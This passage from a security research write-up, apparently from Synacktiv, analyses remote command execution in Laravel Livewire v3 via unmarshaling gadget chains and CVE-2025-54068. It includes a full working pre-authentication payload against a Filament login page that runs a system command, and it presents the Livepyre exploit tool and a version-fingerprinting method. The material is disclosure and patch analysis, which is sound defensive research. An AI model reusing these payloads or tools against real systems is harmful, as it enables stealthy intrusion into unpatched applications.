The last thing needed to finally have a clean end of the code flow was to reach a `die` or `exit` function. Fortunately for us, we quickly identified the `Laravel\Prompts\Terminal` class because it was used as a part of the unserialize gadget [`Laravel/RCE19`](https://github.com/ambionics/phpggc/blob/master/gadgetchains/Laravel/RCE/19/gadgets.php) developed by Maxime Rinaudo.

```php
 1  <?php
 2
 3  namespace Laravel\Prompts;
 4
 5  use ReflectionClass;
 6  use RuntimeException;
 7  use Symfony\Component\Console\Terminal as SymfonyTerminal;
 8
 9  class Terminal
10  {
11
12      public function __construct()
13      {
14          $this->terminal = new SymfonyTerminal();
15      }
16
17      /**
18       * Exit the interactive session.
19       */
20      public function exit(): void
21      {
22          exit(1);
23      }
24
25  }
```

In this class, the `exit` method defined at line 20 becomes directly accessible due to the behavior of Guzzle’s `FnStream` object, whose `__toString` method can trigger callable streams and thereby invoke publicly exposed functions. Since `exit` is declared as a public method, this mechanism allows it to be reached indirectly through the string-casting process performed by `FnStream`, ultimately enabling the method to execute and terminate the interactive session.

This chain cleanly stops the PHP flow without generating an error in Laravel logs, making the exploit stealthier.

![Sneaky remote command execution.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/66ec07dfa201f94f.webp)

As explained above, the recursive hydration scheme leading to the arbitrary command execution without logs is as follows:

![full\_chain](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c493f26fc7c05cab.webp)

Recap of the full exploitation gadget.

### Exploitation using laravel-crypto-killer

![logo\_laravel\_crypto\_killer](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5e7bec71f9ba02c8.webp)

Logo Laravel Crypto Killer.

As long as you have a valid `APP_KEY` and a raw Livewire snapshot, it is possible to craft a payload containing the full gadget chain to compromise Livewire.

Therefore, a module was developed to add the full gadget chain inside `laravel-crypto-killer`, available through the new `exploit` mode:

![New exploit mode.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b0f786908593ad9a.webp)

To use it for Livewire, the following parameters must be specified:

-   `-e`: Specify exploit name (here `livewire`)
-   `-k`: APP_KEY of the application
-   `-j`: Raw JSON or path to a file containing the whole Livewire update JSON
-   `--function`: PHP function to execute
-   `-p`: Parameter value that will be passed to the function

![Exemple of usage.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a6afbe0780595f37.webp)

#### Example on a public application: Snipe-IT

## Bypassing the APP_KEY requirement

### Updates mechanism

In the introduction we showed that Livewire allows to call arbitrary methods on components by using the increment method on the `Counter` component. Nevertheless, it is also possible to directly update a component property by setting it inside the updates value of a Livewire request.

So if we wanted to modify our counter to `1337`, we could manually set its value with the following request:

```swift
POST /livewire/update HTTP/1.1
Host: 192.168.122.184
Content-Length: 407
Cookie: XSRF-TOKEN=ey[...]%3D

{
  "_token": "KAzJ4mhO8NzK8hMkAPjslaNo6hG2W740HoBDzSzA",
  "components": [
    {
      "snapshot": "{\"data\":{\"count\":1},\"memo\":{\"id\":\"4TRWeXVBaMBrHslVVgVi\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"9bfe798289569477fcf865a952a4a8ddeb3c4150df56b4b404e8df400d0aa0be\"}",
      "updates": {
        "count": 1337
      },
      "calls": []
    }
  ]
}
```

![counter\_value\_set\_1337](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fd5f40513641d294.webp)

Value of the counter manually set to 1337 via Livewire's update mechanism

This feature comes with another issue we already talked about: by default, if developers do not enforce strong typing on their component parameters, they will be vulnerable to type juggling. For example, the `count` parameter from `Counter` class is not strongly typed:

```php
<?php
 
namespace App\Livewire;
 
use Livewire\Component;
 
class Counter extends Component
{
    public $count;
 
    public function increment()
    {
        $this->count++;
    }
 
[...]
}
```

Therefore, we are able to set its value as a string or any other value supported by JSON:

```swift
POST /livewire/update HTTP/1.1
Host: 192.168.122.184
Content-Length: 407
Cookie: XSRF-TOKEN=ey[...]%3D

{
  "_token": "KAzJ4mhO8NzK8hMkAPjslaNo6hG2W740HoBDzSzA",
  "components": [
    {
      "snapshot": "{\"data\":{\"count\":1},\"memo\":{\"id\":\"4TRWeXVBaMBrHslVVgVi\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"9bfe798289569477fcf865a952a4a8ddeb3c4150df56b4b404e8df400d0aa0be\"}",
      "updates": {
        "count": "Wait.. I should be an integer"
      },
      "calls": []
    }
  ]
}
```

![wait\_integer](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/99d634bff357962e.webp)

Value of counter defined to "Wait.. I should be an integer"

Therefore, it is possible to cast any weakly typed `snapshot` field to any default basic JSON types from `updates`.

In the following parts of this article, we will explain how to abuse this update mechanism in order to use the full gadget chain detailed previously, in order to achieve remote command execution **without the** `APP_KEY` on Livewire 3.

### Vulnerability analysis

When data is sent in the `updates` field to Livewire, it will be controlled inside the `$value` value in the `hydrateForUpdate` function of the `HandleComponents` class:

```php
 1  <?php
 2
 3  namespace Livewire\Mechanisms\HandleComponents;
 4
 5
 6  class HandleComponents extends Mechanism
 7  {
 8
 9      protected function hydrateForUpdate($raw, $path, $value, $context)
10      {
11          $meta = $this->getMetaForPath($raw, $path); // Verifies if the data contains a synthesizer
12
13          // If we have meta data already for this property, let's use that to get a synth...
14          if ($meta) {
15              return $this->hydrate([$value, $meta], $context, $path);
16          }
17      }
18
19      protected function getMetaForPath($raw, $path)
20      {
21          [...]
22
23          [$data, $meta] = Utils::isSyntheticTuple($raw) ? $raw : [$raw, null];
24          [...]
25
26          return $meta;
27
28  }
```

When updating a value, the snapshot data will be sent to the `hydrateForUpdate` function (line 9) as follows:

-   `$raw`: Value of the data already defined in the snapshot
-   `$path`: Name of the component, in our case it will be `counter`
-   `$value`: Value defined inside the `updates` field
-   `$context`: Global Livewire context

If the `$raw` data, which is already defined, is considered a synthesizer, then Livewire will call the `hydrate` function on the new definition controlled by the user in `$value`. The `isSyntheticTuple` function (cf [Livewire synthesizers chapter](https://www.synacktiv.com/publications/livewire-remote-command-execution-through-unmarshaling#:~:text=Livewire%20synthesizers)) in the `getMetaForPath` function (line 23) checks that the `$raw` data is an array containing exactly two elements. The first one can be anything, but the second one has to be another array containing the key `'s'` (which is a synthesizer static key).

That is where type juggling comes in handy, by default, no security checks are made in Livewire: there are many cases where a component field will be castable as an array via `updates`:

```bash
POST /livewire/update HTTP/1.1
Host: 192.168.122.184
Content-Length: 407
Cookie: XSRF-TOKEN=ey[...]%3D

{
  "_token": "KAzJ4mhO8NzK8hMkAPjslaNo6hG2W740HoBDzSzA",
  "components": [
    {
      "snapshot": "{"data":
                              {
                                "count":1
                                },
                                  [...]
                            }",
      "updates": {
            "count": []
      },
      "calls": []
    }
  ]
}

HTTP/1.1 200 OK
Host: 192.168.122.184
Set-Cookie: [...]joiIn0%3D; expires=Wed, 17 Dec 2025 18:44:31 GMT; Max-Age=7200; path=/; samesite=lax

{
  "components": [
    {
      "snapshot": "{"data":{
                              "count":[
                                  [],
                                 {"s":"arr"}
                               ]
                            },
                             [...]
                           }",
    }
  ],
  "assets": []
}
```

As we can see, when `$count` is set as an array, a new valid snapshot is sent back to the user, but the value of an array becomes `[[], {"s":"arr"}]`.

```php
 1  <?php
 2
 3  namespace Livewire\Mechanisms\HandleComponents;
 4
 5
 6  class HandleComponents extends Mechanism
 7  {
 8      [...]
 9
10     protected function hydrate($valueOrTuple, $context, $path)
11     {
12         if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
13
14         [$value, $meta] = $tuple;
15         [...]
16
17         $synth = $this->propertySynth($meta['s'], $context, $path);
18
19         return $synth->hydrate($value, $meta, function ($name, $child) use ($context, $path) {
20             return $this->hydrate($child, $context, "{$path}.{$name}");
21         });
22     }
23 }
```

It means that we are able to reach the `hydrate` function with a fully controlled `$value`. All that is needed is to cast one value as an array so let us analyze the possibilities:

-   `$valueOrTuple`: Value defined inside the `updates` field in the snapshot
-   `$context`: Livewire's global context
-   `$path`: Keeps track of the current child nesting since hydrate is recursive

Here, like often, the vulnerability is in the details. Inside the `hydrateForUpdate` function, the `$raw` is validated as a synthesizer to reach the `hydrate` function. This check is made again on `$valueOrTuple` with the `$raw` meta value. However, since the `hydrate` function is recursive, it will pop any sub value nested inside a bigger array and replay this check on each `$child`, which can be nested and is fully controlled by the user.

**Therefore, by hiding a synthesizer inside an array, we are able to trigger the full Livewire gadget chain without having to be in possession of the** `APP_KEY` **anymore!**

To be clearer, here is a schema detailing the full idea with full detail on the exploitation process:

![cve-2025-54068](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f5254320e4841631.webp)

CVE-2025-54068 exploitation process.

### Creation of a new tool: Livepyre

In order to easily automate the previous exploits, we created the Livepyre tool which checks and exploits Livewire snapshots with or without `APP_KEY` s depending on the context.

![livepyre](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/67f3f29b10c87020.webp)

Livepyre logo.

```bash
$ python3 Livepyre.py -h
usage: Livepyre.py [-h] -u URL [-f FUNCTION] [-p PARAM] [-H HEADERS]
                   [-P PROXY] [-a APP_KEY] [-d] [-F] [-c]

Livewire exploit tool

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target URL
  -f FUNCTION, --function FUNCTION
                        Function to execute (default: system)
  -p PARAM, --param PARAM
                        Param for function (default: id)
  -H HEADERS, --headers HEADERS
                        Headers to add to the request (default None)
  -P PROXY, --proxy PROXY
                        Proxy URL for requests
  -a APP_KEY, --app-key APP_KEY
                        APP_KEY to sign snapshot
  -d, --debug           Enable debug output
  -F, --force           Force exploit even if version does not seems to be
                        vulnerable
  -c, --check           Only check if the remote target is vulnerable (only
                        revelant for the exploit without the APP_KEY)
```

Livepyre offers two operating modes:

-   Without APP_KEY: Exploit CVE-2025-54068, the only requirement is the URL of the vulnerable application
-   With the APP_KEY: Exploits the design flaw identified in the first part of this blog post, allowing you to get RCE on applications based on Livewire v3.

#### Version fingerprinting

When deploying a website with Livewire, the loaded JavaScript code on the frontend contains a cache buster `?v=<hash>` that contains a specific hash depending on the version of its JavaScript file.

```bash
$ curl -s http://192.168.122.184/counter | tail -n3
<script src="/livewire/livewire.js?id=fcf8c2ad"   data-csrf="Fod816ntEIFvy994OKwIlZOqSB6JAbGG13SggtDn" data-update-uri="/livewire/update" data-navigate-once="true"></script>
</body>
</html>
```

This behavior can be used to fingerprint the Livewire version:

```bash
$ python3 Livepyre.py -u http://192.168.122.184/counter
[INFO] The remove livewire version is v3.6.2, the target is vulnerable.
[INFO] Found snapshot(s). Running exploit.
[...]
```

The tool Livepyre is available [here](https://github.com/synacktiv/Livepyre).

## CVE-2025-54068 patch analysis

This vulnerability was quickly patched and was assigned [CVE-2025-54068](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3).

To fix the vulnerability, the following [patch](https://github.com/livewire/livewire/commit/ef04be759da41b14d2d129e670533180a44987dc) was applied:

```php
 1   <?php
 2
 3   namespace Livewire\Mechanisms\HandleComponents;
 4
 5
 6   class HandleComponents extends Mechanism
 7   {
 8
 9  +     protected function hydratePropertyUpdate($valueOrTuple, $context, $path, $raw)
10 +      {
11 +          if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
12 +          [$value, $meta] = $tuple;
13 +
14 +          // Nested properties get set as `__rm__` when they are removed. We don't want to hydrate these.
15 +
16 +          if ($this->isRemoval($value) && str($path)->contains('.')) {
17 +              return $value;
18 +          }
19 +
20 +           $synth = $this->propertySynth($meta['s'], $context, $path);
21 +
22 +           return $synth->hydrate($value, $meta, function ($name, $child) use ($context, $path, $raw) {
23 +
24 +               return $this->hydrateForUpdate($raw, "{$path}.{$name}", $child, $context);
25 +
26 +           });
27       }
28       [...]
29           protected function hydratePropertyUpdate($valueOrTuple, $context, $path)
30           {
31               [...]
32                   if ($meta) {
33   -                 return $this->hydrate([$value, $meta], $context, $path);
34   +                 return $this->hydratePropertyUpdate([$value, $meta], $context, $path, $raw);
35
36               }
37           }
38
39   }
```

A new `hydratePropertyUpdate` function (line 9) was created. Instead of calling `$child` alone in the hydrate recursion, `$raw` is kept as the first parameter (line 25). Its meta content is kept, which protects the update against (line 13):

-   Arbitrary synthesizer cast
-   Arbitrary class redefinition

It effectively protects against arbitrary redefinition.

## Impact on other Laravel based projects

![livewire\_composer](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/34ad635bded8f32a.webp)

This vulnerability affected many projects. Indeed, Livewire was downloaded 64 million times and [1 754 packages](https://packagist.org/packages/livewire/livewire) depend on it, meaning most of them were exposed to this CVE.

### Demonstration on a real project: Filament

Filament is an open-source Laravel tool for rapidly building elegant, customizable admin panels and CRUD interfaces, powered by Livewire. According to [packagist](https://packagist.org/packages/filament/filament), this project was installed 18 millions times, which is more than one quarter of all Livewire's downloads.

The component `$form` from its [login panel](https://github.com/filamentphp/filament/blob/v3.3.45/packages/panels/src/Pages/Auth/Login.php) is weakly typed, which made it affected pre-authentication:

```php
 1  <?php
 2
 3  namespace Filament\Pages\Auth;
 4  [...]
 5
 6  /**
 7   * @property Form $form
 8   */
 9  class Login extends SimplePage
10  {
11      use InteractsWithFormActions;
12      use WithRateLimiting;
13
14      /**
15       * @var view-string
16       */
17      protected static string $view = 'filament-panels::pages.auth.login';
18
19      /**
20       * @var array<string, mixed> | null
21       */
22      public ?array $data = [];
23
24      public function mount(): void
25      {
26          if (Filament::auth()->check()) {
27              redirect()->intended(Filament::getUrl());
28          }
29
30          $this->form->fill();
31      }
32      [...]
33  }
```

As we can see on the previous code, the property `$this->form`, is assigned as a Form synthesizer (line 7) from the `@property` annotation. Because `form` is already a synthesizer, it removes the requirement to cast an element as an array, therefore, Livepyre will use `form` to send the full payload from `updates`, directly triggering the code execution:

```bash
POST /livewire/update HTTP/1.1
Host: 192.168.90.100:8000
[...]
Content-Length: 1592
Content-Type: application/json

{
  "_token": "EYPUvUKvuSdxKjCF3ZDCUHdayvEjD2MIKZCW6RLn",
  "components": [
    {
      "snapshot": "{\"data\": {\"form\": [{\"email\": \"\", \"password\": \"\", \"remember\": false}, {\"class\": \"App\\\\Livewire\\\\Forms\\\\LoginForm\", \"s\": \"form\"}]}, \"memo\": {\"id\": \"JcltDyhVBLY0icPUhGLG\", \"name\": \"pages.auth.login\", \"path\": \"login\", \"method\": \"GET\", \"children\": [], \"scripts\": [], \"assets\": [], \"errors\": [], \"locale\": \"en\"}, \"checksum\": \"5e6cb3790a1c61816f28bb1a8d92c9704ac67a7b2d5000c568305c704ba7cced\"}",
      "updates": {
        "form": [
          1,
          [
            {
              "a": [
                {
                  "__toString": "phpversion",
                  "close": [
                    [
                      [
                        {
                          "chained": [
                            "O:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":4:{s:5:\"dummy\";O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\u0000*\u0000events\";O:31:\"Illuminate\\Validation\\Validator\":1:{s:10:\"extensions\";a:1:{s:0:\"\";s:6:\"system\";}}s:8:\"\u0000*\u0000event\";s:2:\"id\";}s:10:\"connection\";N;s:5:\"queue\";N;s:5:\"event\";O:37:\"Illuminate\\Notifications\\Notification\":0:{}}"
                          ]
                        },
                        {
                          "s": "form",
                          "class": "Illuminate\\Broadcasting\\BroadcastEvent"
                        }
                      ],
                      "dispatchNextJobInChain"
                    ],
                    {
                      "s": "clctn",
                      "class": "Laravel\\SerializableClosure\\Serializers\\Signed"
                    }
                  ]
                },
                {
                  "s": "clctn",
                  "class": "GuzzleHttp\\Psr7\\FnStream"
                }
              ],
              "b": [
                {
                  "__toString": [
                    [
                      [
                        null,
                        {
                          "s": "mdl",
                          "class": "Laravel\\Prompts\\Terminal"
                        }
                      ],
                      "exit"
                    ],
                    {
                      "s": "clctn",
                      "class": "Laravel\\SerializableClosure\\Serializers\\Signed"
                    }
                  ]
                },
                {
                  "s": "clctn",
                  "class": "GuzzleHttp\\Psr7\\FnStream"
                }
              ]
            },
            {
              "class": "League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator",
              "s": "clctn"
            }
          ]
        ]
      },
      "calls": []
    }
  ]
}

HTTP/1.1 200 OK
Host: 192.168.90.100:8000
[...]

uid=1000(user) gid=1000(user) groups=1000(user),4(adm), 24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
uid=1000(user) gid=1000(user) groups=1000(user),4(adm), 24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
```

You can see the full exploit on the folllowing video:

### Exchange regarding the APP_KEY requirement

The exploit version requiring the `APP_KEY` was not patched because it exploits the way Livewire is designed. Since it requires the `APP_KEY` to be exploited, Livewire team did not consider it as a security issue. Therefore, being in possession of the `APP_KEY` on a newer than version 3 Livewire based application means you can fully compromise it.

It is also important to keep in mind that several `APP_KEYs` are default ones on thousands of publicly exposed Laravel applications, we already published a full blog post dedicated to this subject: [https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis](https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis).

## Conclusion

Our research demonstrates that by chaining Livewire’s synthesizer classes with already defined classes, an attacker can craft payloads that achieve stealthy remote code execution when the `APP_KEY` is known. The exploit leverages Livewire’s recursive hydration to instantiate arbitrary objects and execute attacker-controlled code during the component’s state restoration. This process, while complex, highlights the dangers of trusting user-controlled data and the lack of strict type enforcement in PHP frameworks.

The discovery of `CVE-2025-54068` further exposed a critical flaw: the ability to smuggle synthesizers via the `updates` mechanism, entirely bypassing the need for the `APP_KEY`. This vulnerability, now patched, forced Livewire to harden its hydration logic by preserving the original snapshot context during recursive calls. However, the `APP_KEY` dependent exploit remains unpatched, as the Livewire team considers `APP_KEY` exposure a sufficient security boundary. Yet, given the prevalence of [leaked or default](https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis) `APP_KEY` s in the wild, this stance may underestimate real-world risk.

To automate both attacks, we developed `Livepyre`, a tool that streamlines exploitation with and without the `APP_KEY`.

Ultimately, Livewire’s case is a stark reminder that innovative features, when built on loose typing and implicit trust, can become powerful exploit chains. For Livewire users, upgrading to version 3.6.4+ is non-negotiable, but the real fix lies in adopting secure coding practices: strict types and controlled user data to prevent critical security flaws.
